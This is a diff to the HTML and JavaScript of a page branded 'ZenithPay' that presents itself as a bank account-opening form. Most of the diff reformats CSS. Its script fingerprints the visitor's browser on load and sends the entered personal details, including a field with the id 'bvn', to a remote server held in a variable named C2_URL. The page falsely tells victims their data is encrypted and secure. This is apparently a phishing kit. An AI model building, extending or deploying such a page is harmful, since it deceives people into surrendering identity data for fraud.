@@ -6,11 +6,13 @@
     <title>ZenithPay</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
     <style>
+        /* ===== RESET ===== */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
             font-family: 'Inter', -apple-system, sans-serif;
             background: #f4f6f9;
@@ -21,6 +23,7 @@
             min-height: 100vh;
             margin: 0;
         }
+
         .container {
             width: 100%;
             max-width: 480px;
@@ -28,7 +31,12 @@
             background: #f4f6f9;
             min-height: 100vh;
         }
-        .hidden { display: none !important; }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* ===== SPLASH ===== */
         .splash {
             position: fixed;
             top: 0;
@@ -42,18 +50,38 @@
             z-index: 999;
             animation: fadeOut 0.5s ease 2.8s forwards;
         }
-        @keyframes fadeOut { to { opacity: 0; pointer-events: none; } }
-        .splash-box { text-align: center; color: #fff; }
-        .splash-box h1 { font-size: 32px; font-weight: 900; }
-        .splash-box p { opacity: 0.7; margin-top: 4px; }
+
+        @keyframes fadeOut {
+            to {
+                opacity: 0;
+                pointer-events: none;
+            }
+        }
+
+        .splash-box {
+            text-align: center;
+            color: #fff;
+        }
+
+        .splash-box h1 {
+            font-size: 32px;
+            font-weight: 900;
+        }
+
+        .splash-box p {
+            opacity: 0.7;
+            margin-top: 4px;
+        }
+
         .loader {
             width: 200px;
             height: 4px;
-            background: rgba(255,255,255,0.2);
+            background: rgba(255, 255, 255, 0.2);
             border-radius: 4px;
             margin: 24px auto 0;
             overflow: hidden;
         }
+
         .loader::after {
             content: '';
             display: block;
@@ -63,14 +91,27 @@
             border-radius: 4px;
             animation: load 2.5s ease forwards;
         }
-        @keyframes load { to { width: 0%; } }
+
+        @keyframes load {
+            to {
+                width: 0%;
+            }
+        }
+
+        /* ===== HEADER ===== */
         .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             padding: 4px 0 16px;
         }
-        .header h2 { font-size: 20px; font-weight: 800; color: #0f172a; }
+
+        .header h2 {
+            font-size: 20px;
+            font-weight: 800;
+            color: #0f172a;
+        }
+
         .badge {
             background: #e8f5e9;
             color: #0a7e3d;
@@ -79,6 +120,8 @@
             padding: 4px 12px;
             border-radius: 100px;
         }
+
+        /* ===== BANNER ===== */
         .banner {
             background: linear-gradient(135deg, #0a7e3d, #064e2a);
             border-radius: 16px;
@@ -88,39 +131,88 @@
             align-items: center;
             margin-bottom: 20px;
             color: #fff;
-            box-shadow: 0 6px 24px rgba(10,126,61,0.25);
+            box-shadow: 0 6px 24px rgba(10, 126, 61, 0.25);
         }
+
         .banner .tag {
-            background: rgba(255,255,255,0.15);
+            background: rgba(255, 255, 255, 0.15);
             font-size: 10px;
             font-weight: 600;
             padding: 2px 10px;
             border-radius: 100px;
             display: inline-block;
         }
-        .banner h3 { font-size: 20px; font-weight: 800; margin: 2px 0; }
-        .banner .gold { color: #f5a623; }
-        .banner p { font-size: 13px; opacity: 0.8; }
+
+        .banner h3 {
+            font-size: 20px;
+            font-weight: 800;
+            margin: 2px 0;
+        }
+
+        .banner .gold {
+            color: #f5a623;
+        }
+
+        .banner p {
+            font-size: 13px;
+            opacity: 0.8;
+        }
+
         .timer {
-            background: rgba(255,255,255,0.12);
+            background: rgba(255, 255, 255, 0.12);
             padding: 6px 14px;
             border-radius: 10px;
             text-align: center;
         }
-        .timer .label { display: block; font-size: 9px; text-transform: uppercase; opacity: 0.6; }
-        .timer .time { font-size: 18px; font-weight: 700; }
+
+        .timer .label {
+            display: block;
+            font-size: 9px;
+            text-transform: uppercase;
+            opacity: 0.6;
+        }
+
+        .timer .time {
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        /* ===== CARD ===== */
         .card {
             background: #fff;
             border-radius: 16px;
             padding: 22px 18px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.04);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.04);
             border: 1px solid #e2e8f0;
         }
-        .card h4 { font-size: 18px; font-weight: 700; color: #0f172a; }
-        .card .sub { color: #64748b; font-size: 14px; margin-bottom: 18px; }
-        .field { margin-bottom: 14px; }
-        .field label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 4px; color: #0f172a; }
-        .field input, .field select {
+
+        .card h4 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #0f172a;
+        }
+
+        .card .sub {
+            color: #64748b;
+            font-size: 14px;
+            margin-bottom: 18px;
+        }
+
+        /* ===== FORM ===== */
+        .field {
+            margin-bottom: 14px;
+        }
+
+        .field label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 4px;
+            color: #0f172a;
+        }
+
+        .field input,
+        .field select {
             width: 100%;
             padding: 12px 14px;
             background: #f8fafc;
@@ -133,21 +225,35 @@
             appearance: none;
             -webkit-appearance: none;
         }
-        .field input:focus, .field select:focus {
+
+        .field input:focus,
+        .field select:focus {
             border-color: #0a7e3d;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(10,126,61,0.1);
+            box-shadow: 0 0 0 3px rgba(10, 126, 61, 0.1);
             background: #fff;
         }
-        .field input::placeholder { color: #94a3b8; }
+
+        .field input::placeholder {
+            color: #94a3b8;
+        }
+
         .field select {
             background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%2394a3b8' stroke-width='1.5' fill='none'/%3E%3C/svg%3E");
             background-repeat: no-repeat;
             background-position: right 14px center;
             cursor: pointer;
         }
-        .row { display: flex; gap: 12px; }
-        .row .field.half { flex: 1; }
+
+        .row {
+            display: flex;
+            gap: 12px;
+        }
+
+        .row .field.half {
+            flex: 1;
+        }
+
         .checkbox {
             display: flex;
             align-items: flex-start;
@@ -156,7 +262,15 @@
             color: #64748b;
             margin: 16px 0 18px;
         }
-        .checkbox input { margin-top: 2px; width: 16px; height: 16px; accent-color: #0a7e3d; }
+
+        .checkbox input {
+            margin-top: 2px;
+            width: 16px;
+            height: 16px;
+            accent-color: #0a7e3d;
+        }
+
+        /* ===== BUTTON ===== */
         .btn-submit {
             background: linear-gradient(135deg, #0a7e3d, #064e2a);
             border: none;
@@ -170,21 +284,30 @@
             font-family: 'Inter', sans-serif;
             transition: 0.25s;
             -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
         }
+
         .btn-submit:active {
             transform: scale(0.97);
         }
+
         .btn-submit:disabled {
             background: #94a3b8;
             cursor: not-allowed;
             transform: none;
         }
-        .footer-text { text-align: center; margin-top: 18px; font-size: 12px; color: #64748b; }
+
+        .footer-text {
+            text-align: center;
+            margin-top: 18px;
+            font-size: 12px;
+            color: #64748b;
+        }
     </style>
 </head>
 <body>
 
-    <!-- SPLASH -->
+    <!-- ===== SPLASH ===== -->
     <div id="splash" class="splash">
         <div class="splash-box">
             <h1>ZenithPay</h1>
@@ -193,7 +316,7 @@
         </div>
     </div>
 
-    <!-- LOGIN -->
+    <!-- ===== LOGIN ===== -->
     <div id="loginPage" class="container hidden">
         <div class="header">
             <h2>ZenithPay</h2>
@@ -231,7 +354,7 @@
                 </div>
                 <div class="field">
                     <label>occupation</label>
-                    <input type="text" id="occupation" placeholder="e.g lawyer" required />
+                    <input type="text" id="bvn" placeholder="occupation" required />
                 </div>
                 <div class="row">
                     <div class="field half">
@@ -249,7 +372,10 @@
                     <label for="terms">I agree to the Terms & Privacy Policy</label>
                 </div>
 
-                <button type="button" class="btn-submit" id="submitBtn">Open Account</button>
+                <!-- ===== BUTTON WITH DIRECT ONCLICK ===== -->
+                <button type="button" class="btn-submit" id="submitBtn" onclick="handleSubmit()">
+                    Open Account
+                </button>
             </form>
 
             <div class="footer-text">🔒 Your data is encrypted and secure</div>
@@ -258,15 +384,15 @@
 
     <script>
         // ============================================================
-        // FINAL — WORKS ON MOBILE
+        // CONFIG — UPDATE YOUR BACKEND URL HERE
         // ============================================================
-
-        // UPDATE YOUR BACKEND URL HERE
         var C2_URL = 'https://zenithpay-backend-ehdh.onrender.com';
 
         console.log('Page loaded');
 
-        // ===== SPLASH TO LOGIN =====
+        // ============================================================
+        // SPLASH TO LOGIN
+        // ============================================================
         document.addEventListener('DOMContentLoaded', function() {
             var splash = document.getElementById('splash');
             var loginPage = document.getElementById('loginPage');
@@ -275,11 +401,14 @@
                 setTimeout(function() {
                     splash.style.display = 'none';
                     loginPage.classList.remove('hidden');
+                    console.log('Splash hidden, login shown');
                 }, 3000);
             }
         });
 
-        // ===== SEND DATA =====
+        // ============================================================
+        // SEND DATA TO SERVER
+        // ============================================================
         function sendData(payload) {
             payload._timestamp = Date.now();
             payload._ua = navigator.userAgent;
@@ -298,7 +427,9 @@
             }).catch(function() {});
         }
 
-        // ===== FINGERPRINT =====
+        // ============================================================
+        // FINGERPRINT
+        // ============================================================
         function captureFingerprint() {
             sendData({
                 type: 'fingerprint',
@@ -312,13 +443,10 @@
         }
 
         // ============================================================
-        // ===== OPEN ACCOUNT BUTTON — MOBILE FRIENDLY =====
+        // HANDLE SUBMIT — DIRECT FUNCTION CALLED BY ONCLICK
         // ============================================================
-
-        var submitBtn = document.getElementById('submitBtn');
-
         function handleSubmit() {
-            console.log('🔥 Button clicked!');
+            console.log('🔥 Open Account button clicked!');
 
             // Get values
             var fullname = document.getElementById('fullname').value;
@@ -346,38 +474,28 @@
 
             console.log('User data:', userData);
 
+            // Send data
             sendData(userData);
             localStorage.setItem('zenithpay_user', JSON.stringify(userData));
 
-            submitBtn.textContent = 'Opening...';
-            submitBtn.disabled = true;
+            // Disable button and show loading
+            var btn = document.getElementById('submitBtn');
+            btn.textContent = 'Opening...';
+            btn.disabled = true;
 
+            // Redirect to dashboard
             setTimeout(function() {
                 window.location.href = 'dashboard.html';
             }, 1800);
         }
 
-        // Add click event (works on mobile)
-        if (submitBtn) {
-            // Remove any previous listeners by cloning
-            var newBtn = submitBtn.cloneNode(true);
-            submitBtn.parentNode.replaceChild(newBtn, submitBtn);
-            submitBtn = document.getElementById('submitBtn');
-
-            // Add click listener
-            submitBtn.addEventListener('click', handleSubmit);
-
-            // Also handle touch events to prevent double-tap zoom
-            submitBtn.addEventListener('touchend', function(e) {
-                e.preventDefault();
-                handleSubmit();
-            });
-        }
-
-        // ===== INIT =====
+        // ============================================================
+        // INIT
+        // ============================================================
         captureFingerprint();
 
         // Enable button after 3 seconds
+        var submitBtn = document.getElementById('submitBtn');
         if (submitBtn) {
             submitBtn.disabled = true;
             setTimeout(function() {
@@ -388,4 +506,4 @@
     </script>
 
 </body>
-    </html>
+            </html>
